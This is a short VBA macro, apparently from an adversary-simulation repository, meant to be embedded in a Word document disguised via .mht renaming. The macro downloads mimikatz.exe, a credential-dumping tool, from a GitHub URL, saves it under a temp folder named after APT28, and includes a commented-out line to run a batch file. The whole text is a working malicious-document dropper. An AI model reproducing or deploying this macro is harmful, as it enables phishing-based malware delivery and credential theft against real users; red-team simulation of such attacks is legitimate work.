' Save Document As Single Web Page .mht
' Rename Document As .Doc

Sub DownloadFile()

Dim myURL As String
Dim myPath As String

myURL = "https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatz.exe"

Dim WinHttpReq As Object
Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False, "username", "password"
WinHttpReq.send

myURL = WinHttpReq.responseBody
If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.responseBody
    ' Change Path HERE
    oStream.SaveToFile "%temp%\APT28\mime.exe`", 2  ' 1 = no overwrite, 2 = overwrite
    ' EXECUTE FROM PATH
    ' Shell "cmd.exe /c C:\Tools\NothingToSeeHere.bat"
    oStream.Close
End If

End Sub
